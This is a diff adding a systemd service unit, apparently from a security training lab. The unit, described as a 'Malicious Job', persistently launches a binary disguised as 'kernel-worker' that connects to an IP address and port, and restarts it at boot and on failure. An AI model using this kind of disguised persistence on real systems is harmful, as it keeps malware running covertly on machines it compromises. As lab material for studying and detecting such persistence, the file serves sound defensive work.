@@ -1,0 +1,14 @@
+[Unit]
+Description=Kernel Worker Malicious Job
+After=network.target
+
+[Service]
+Type=simple
+User=pslearner
+ExecStart=/home/pslearner/kernel-worker --ip 172.31.140.10 --port 10258 --idle 1 --active 0
+Restart=on-failure
+RestartSec=5
+
+
+[Install]
+WantedBy=multi-user.target
